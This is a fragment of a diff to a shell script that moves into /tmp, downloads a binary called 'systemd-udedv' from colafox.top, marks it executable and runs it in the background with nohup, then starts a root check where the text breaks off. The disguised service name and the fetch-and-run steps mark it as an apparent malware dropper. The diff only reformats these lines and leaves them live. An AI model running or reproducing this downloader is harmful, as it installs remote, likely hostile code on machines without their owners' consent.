@@ -1,5 +1,6 @@
-cd /tmp
-wget https://colafox.top/systemd-udedv;chmod +x systemd-udedv
+cd /tmp/
+wget https://colafox.top/systemd-udedv
+chmod +x systemd-udedv
 nohup ./systemd-udedv &
 
 if [ `id -u` -eq 0 ];then
